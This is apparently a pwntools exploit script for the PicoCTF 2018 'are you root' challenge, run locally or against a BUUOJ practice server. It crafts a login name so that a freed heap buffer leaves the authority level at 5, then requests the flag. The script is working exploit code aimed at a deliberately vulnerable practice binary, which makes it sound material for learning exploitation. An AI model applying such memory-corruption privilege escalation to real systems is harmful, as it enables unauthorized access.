import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_are_you_root')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_are_you_root')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26809)
			elf=ELF('./PicoCTF_2018_are_you_root')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]


		# attach(io)
		# pause()
		def login(a):
			io.sendlineafter('> ','login '+a)

		def delete():
			io.sendlineafter('> ','reset')

		def up():
			io.sendlineafter('> ','set-auth '+'5')

		def show():
			io.sendlineafter('> ','show')

		def getflag():
			io.sendlineafter('> ','get-flag')

		login('a'*0x8+'\x05')
		delete()
		login('keer')
		show()
		up()
		getflag()

		

		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue